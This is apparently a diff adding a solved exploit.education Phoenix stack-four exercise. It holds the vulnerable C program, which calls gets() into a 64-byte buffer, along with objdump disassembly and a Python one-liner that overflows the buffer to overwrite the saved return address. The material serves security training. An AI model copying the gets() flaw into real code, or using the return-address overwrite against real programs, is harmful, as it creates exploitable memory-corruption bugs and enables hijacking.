@@ -1,0 +1,105 @@
+/*
+ * phoenix/stack-four, by https://exploit.education
+ *
+ * The aim is to execute the function complete_level by modifying the
+ * saved return address, and pointing it to the complete_level() function.
+ *
+ * Why were the apple and orange all alone? Because the bananna split.
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void complete_level() {
+  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
+  exit(0);
+}
+
+void start_level() {
+  char buffer[64];
+  void *ret;
+
+  gets(buffer);
+
+  ret = __builtin_return_address(0);
+  printf("and will be returning to %p\n", ret);
+}
+
+int main(int argc, char **argv) {
+  printf("%s\n", BANNER);
+  start_level();
+}
+
+// We want to return to 
+0x40061d
+0x40 0x06 0x1d
+
+// Our buffer is being saved in [rbp - 0x50] 
+// at rbp we have 64 bits (0x8 bytes) of the previously stored base pointer and then another 64bits (0x8 bytes) of the return address
+// We want to change the return address to 0x40061d
+ 
+Solution:
+    python -c "print('a'*(0x50 + 0x8) + chr(0x1d) + chr(0x06) + chr(0x40))" | ./stack-four
+
+
+objdump -M intel -d stack-four:
+
+000000000040061d <complete_level>:
+  40061d:	55                   	push   rbp
+  40061e:	48 89 e5             	mov    rbp,rsp
+  400621:	bf f0 06 40 00       	mov    edi,0x4006f0
+  400626:	e8 55 fe ff ff       	call   400480 <puts@plt>
+  40062b:	bf 00 00 00 00       	mov    edi,0x0
+  400630:	e8 5b fe ff ff       	call   400490 <exit@plt>
+
+0000000000400635 <start_level>:
+  400635:	55                   	push   rbp
+  400636:	48 89 e5             	mov    rbp,rsp
+
+  400639:	48 83 ec 50          	sub    rsp,0x50
+  40063d:	48 8d 45 b0          	lea    rax,[rbp-0x50]
+
+  400641:	48 89 c7             	mov    rdi,rax
+  400644:	e8 27 fe ff ff       	call   400470 <gets@plt>
+
+  400649:	48 8b 45 08          	mov    rax,QWORD PTR [rbp+0x8]
+  40064d:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
+  400651:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
+  400655:	48 89 c6             	mov    rsi,rax
+
+  400658:	bf 33 07 40 00       	mov    edi,0x400733
+  40065d:	b8 00 00 00 00       	mov    eax,0x0
+  400662:	e8 f9 fd ff ff       	call   400460 <printf@plt>
+
+  400667:	90                   	nop
+  400668:	c9                   	leave  
+  400669:	c3                   	ret    
+
+000000000040066a <main>:
+  40066a:	55                   	push   rbp
+  40066b:	48 89 e5             	mov    rbp,rsp
+  40066e:	48 83 ec 10          	sub    rsp,0x10
+
+  400672:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
+  400675:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
+
+  400679:	bf 50 07 40 00       	mov    edi,0x400750
+  40067e:	e8 fd fd ff ff       	call   400480 <puts@plt>
+
+  400683:	b8 00 00 00 00       	mov    eax,0x0
+  400688:	e8 a8 ff ff ff       	call   400635 <start_level>
+
+  40068d:	b8 00 00 00 00       	mov    eax,0x0
+  400692:	c9                   	leave  
+  400693:	c3                   	ret    
+  400694:	66 2e 0f 1f 84 00 00 	nop    WORD PTR cs:[rax+rax*1+0x0]
+  40069b:	00 00 00 
+  40069e:	66 90                	xchg   ax,ax
